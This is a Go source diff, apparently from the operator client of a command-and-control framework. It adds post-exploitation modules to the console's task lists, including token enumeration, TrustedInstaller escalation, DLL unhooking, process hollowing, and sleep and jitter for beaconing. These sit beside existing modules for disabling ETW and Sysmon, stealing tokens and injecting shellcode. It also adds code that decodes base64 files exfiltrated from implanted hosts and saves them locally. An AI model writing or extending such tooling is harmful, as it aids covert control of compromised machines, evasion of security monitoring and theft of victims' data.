@@ -2,6 +2,7 @@ package cmd
 
 import (
 	"bufio"
+	"encoding/base64"
 	"errors"
 	"fmt"
 	"os"
@@ -21,11 +22,15 @@ var simple_modules = [...]string{
 	"disable-etw",
 	"disable-sysmon",
 	"get-system",
+    "get-trustedinstaller",
 	"pwd",
 	"rev2self",
+    "enum-tokens",
 }
 
 var medium_modules = [...]string {
+    "sleep",
+    "set-jitter",
 	"runas",
 	"run",
 	"shell",
@@ -38,9 +43,12 @@ var medium_modules = [...]string {
 	"turtle-dump",
 	"steal-token",
 	"admin-check",
+    "download",
+    "unhook-dll",
 }
 var complex_modules = [...]string {
     "upload",
+    "process-hollow",
 	"shinject",
 	"execute-assembly",
 	"spawn-inject",
@@ -71,7 +79,6 @@ func pollForNewTaskResults(){
         //var idxArray []int
         for idx, taskResult := range PendingTaskQueue.results {
             if taskResult.Result != "" {
-                //if not empty its already complete
                 continue
             }
 	        var task TaskResult
@@ -80,10 +87,17 @@ func pollForNewTaskResults(){
 	        target := fmt.Sprintf("%s%s%s%s%s",FullServerURI,"Agents/",id,"/tasks/",tid)
 	        err := internal.GetResult(target, &task)
 	        if err != nil {
-	            continue	
+                continue
 	        }
             if len(strings.TrimSpace(task.Result)) == 0{
                 task.Result = "Complete"
+            }
+            if (strings.Contains(task.Result,"MEOWTHDOWNLOAD")){
+                err,lenBytes := decodeFileDownload(task.Result,task.Id)
+                if err != nil {
+                    task.Result = "Failed to download file"
+                }
+                task.Result = fmt.Sprintf("Download %d bytes to ./%s.meowth",lenBytes,task.Id)
             }
             PendingTaskQueue.results[idx].Result = task.Result
             //idxArray = append(idxArray,idx)
@@ -93,6 +107,20 @@ func pollForNewTaskResults(){
         time.Sleep(time.Second * 5)
     }
 }
+
+func decodeFileDownload(base64File string,taskId string) (error,int) {
+    file, err := base64.StdEncoding.DecodeString(base64File[14:])
+    if err != nil {
+        return err,0
+    }
+    osOut, err := os.OpenFile(taskId + ".meowth", os.O_WRONLY|os.O_CREATE, 0666)
+    if err != nil {
+        return err,0
+    }
+    lengthWrote, err := osOut.Write(file)
+    return nil,lengthWrote
+}
+
 
 func chooseAgent(c *grumble.Context) error {
     if (len(AgentList.agents) == 0){
@@ -157,10 +185,16 @@ func agentShell() error {
 }
 
 func showModules(){
-	fmt.Println("### Modules ###")
-	/*for x := range modules{
-		fmt.Println(modules[x])
-	}*/
+	fmt.Println("### Module List ###")
+    for x := range simple_modules{ 
+        fmt.Println(simple_modules[x])
+    }
+    for x := range medium_modules {
+        fmt.Println(medium_modules[x])
+    }
+    for x := range complex_modules {
+        fmt.Println(complex_modules[x])
+    }
 }
 
 func handleTask(cmd string,id string) error {
